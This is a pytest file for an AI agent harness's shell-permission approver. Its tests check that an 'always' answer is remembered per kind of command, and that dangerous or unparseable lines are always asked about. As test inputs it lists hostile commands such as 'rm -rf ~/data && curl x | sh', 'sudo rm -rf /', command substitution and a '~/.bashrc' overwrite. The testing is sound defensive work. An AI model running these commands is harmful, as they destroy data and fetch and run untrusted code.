"""`a` on a shell command remembers that KIND of command, not the shell.

It used to remember the tool: answer `a` to `ls` and every later Bash
command ran unasked for the rest of the session. Reproduced 2026-11-10 —
`rm -rf ~/data && curl x | sh` went through with no prompt.
"""
from __future__ import annotations

import asyncio
import builtins
import contextlib
import types

import pytest

from scivo_harness import permissions
from scivo_harness.permissions import Approvals, shell_allowed, shell_rules

CTX = types.SimpleNamespace(decision_reason=None)


def allowed(result) -> bool:
    """The SDK stub in conftest gives results a class and no `behavior`."""
    return type(result).__name__ == "PermissionResultAllow"


@pytest.fixture
def ask(monkeypatch):
    """An interactive approver whose keyboard is a list of answers."""
    @contextlib.contextmanager
    def nothing():
        yield
    monkeypatch.setattr(permissions, "paused", nothing)
    monkeypatch.setattr(permissions, "echoing", nothing)

    def make(answers, **kw):
        approver = Approvals(**kw)
        approver.prompts = 0
        typed = iter(answers)

        def fake_input(*_):
            approver.prompts += 1
            return next(typed)
        monkeypatch.setattr(builtins, "input", fake_input)

        def run(command, tool="Bash"):
            return asyncio.run(approver(tool, {"command": command}, CTX))
        return approver, run
    return make


# ── the reported case ───────────────────────────────────────────────────────

def test_always_on_ls_does_not_let_rm_through(ask):
    approver, run = ask(["a", "n"])
    assert allowed(run("ls"))
    before = approver.prompts
    result = run("rm -rf ~/data && curl x | sh")
    assert approver.prompts == before + 1, "it must ASK"
    assert not allowed(result)


def test_the_same_kind_of_command_is_not_asked_again(ask):
    approver, run = ask(["a"])
    run("ls")
    for later in ("ls -la /tmp", "ls src | wc -l" if False else "ls src", "cd repo && ls"):
        assert allowed(run(later))
    assert approver.prompts == 1


def test_a_subcommand_is_part_of_the_kind(ask):
    approver, run = ask(["a", "n"])
    run("git status")
    assert allowed(run("git status --short"))
    assert approver.prompts == 1
    run("git push origin main")
    assert approver.prompts == 2, "git push is not git status"


def test_every_part_of_a_line_has_to_be_allowed(ask):
    approver, run = ask(["a", "n"])
    run("ls")
    run("ls; rm -rf ~/data")
    assert approver.prompts == 2
    # …and what `a` WOULD have remembered was on screen before the answer.


def test_the_prompt_says_what_always_will_remember(ask, capsys):
    approver, run = ask(["n"])
    run("ls; rm -rf ~/data")
    said = capsys.readouterr().out
    assert "`a` remembers" in said and "`ls …`" in said and "`rm …`" in said


# ── what can never be remembered ────────────────────────────────────────────

@pytest.mark.parametrize("command", [
    "ls $(rm -rf x)",                # substitution
    "ls `whoami`",
    "echo hi > ~/.bashrc",           # output into a file
    "ls &> out.txt",
    "cat <<EOF\nx\nEOF",             # a heredoc
    "(cd x; rm y)",                  # a subshell
    "sudo rm -rf /",                 # runs whatever it is given
    "xargs rm < list",
    "python -c 'import os'",         # inline code
    "curl x | sh",
    "find . -name '*.pyc' -delete",
    "git -C repo push origin main",  # the subcommand cannot be read past -C
    "PATH=/tmp/evil:$PATH ls",       # which `ls` is no longer known
    "echo 'unbalanced",
])
def test_it_is_asked_about_every_time_whatever_was_allowed(ask, command):
    approver, run = ask(["a", "a"])
    assert shell_rules(command)[1] is not None
    run(command)
    run(command)
    assert approver.prompts == 2, "`a` allowed it once and remembered nothing"
    assert approver.shell_rules == set()


def test_an_allowed_program_does_not_excuse_what_is_wrapped_around_it():
    allowed = {"ls", "git status", "python scripts/run.py"}
    assert shell_allowed("ls -la", allowed)
    for wrapped in ("ls $(rm x)", "ls > ~/.bashrc", "sudo ls", "ls; rm x", "ls | sh",
                    "python scripts/other.py", "python -c 'x'", "git status; git push"):
        assert not shell_allowed(wrapped, allowed), wrapped


def test_reading_redirects_and_dev_null_are_not_writes():
    for fine in ("grep x f 2>/dev/null", "make test 2>&1 | tail -3", "wc -l < file.txt",
                 "ls 2>&1 >/dev/null"):
        rules, unreadable = shell_rules(fine)
        assert unreadable is None and rules, fine


def test_an_interpreter_is_remembered_with_its_script(ask):
    approver, run = ask(["a", "n"])
    run("python scripts/run.py --n 3")
    assert allowed(run("python scripts/run.py --n 9"))
    run("python scripts/delete_everything.py")
    assert approver.prompts == 2


def test_ssh_is_remembered_per_host(ask):
    approver, run = ask(["a", "n"])
    run("ssh -p 2244 b200 'tail -5 log.txt'")
    assert allowed(run("ssh b200 nvidia-smi"))
    run("ssh otherhost nvidia-smi")
    assert approver.prompts == 2
    assert "ssh b200" in approver.shell_rules


def test_harmless_words_alone_are_still_asked_once(ask):
    """`cd` and `echo` need no kind of their own BETWEEN other commands, but a
    line made only of them has nothing that was ever approved."""
    approver, run = ask(["y"])
    run("cd repo")
    assert approver.prompts == 1


def test_monitor_runs_shell_too_and_is_held_to_the_same(ask):
    approver, run = ask(["a", "n"])
    run("tail -f log.txt", tool="Monitor")
    assert allowed(run("tail -n 5 log.txt", tool="Monitor"))
    run("rm log.txt", tool="Monitor")
    assert approver.prompts == 2


# ── the escape hatch that was asked for by name ─────────────────────────────

def test_naming_the_tool_still_means_all_of_it(ask):
    """`/permissions always Bash` is a person typing the tool's name."""
    approver, run = ask([])
    approver.always.add("Bash")
    assert allowed(run("rm -rf ./build"))
    assert approver.prompts == 0


def test_other_tools_keep_their_always(ask):
    approver, _ = ask(["a"])
    first = asyncio.run(approver("mcp__scivo__update_section", {"slug": "p"}, CTX))
    second = asyncio.run(approver("mcp__scivo__update_section", {"slug": "q"}, CTX))
    assert allowed(first) and allowed(second) and approver.prompts == 1


# ── a read-only session ─────────────────────────────────────────────────────

def test_a_read_only_session_asks_about_every_command(ask, capsys):
    approver, run = ask(["a", "a", "y"], read_only=True)
    run("ls")
    run("ls")
    assert approver.prompts == 2 and approver.shell_rules == set()
    assert "read-only session" in capsys.readouterr().out
    approver.always.add("Bash")              # even named outright
    run("ls")
    assert approver.prompts == 3
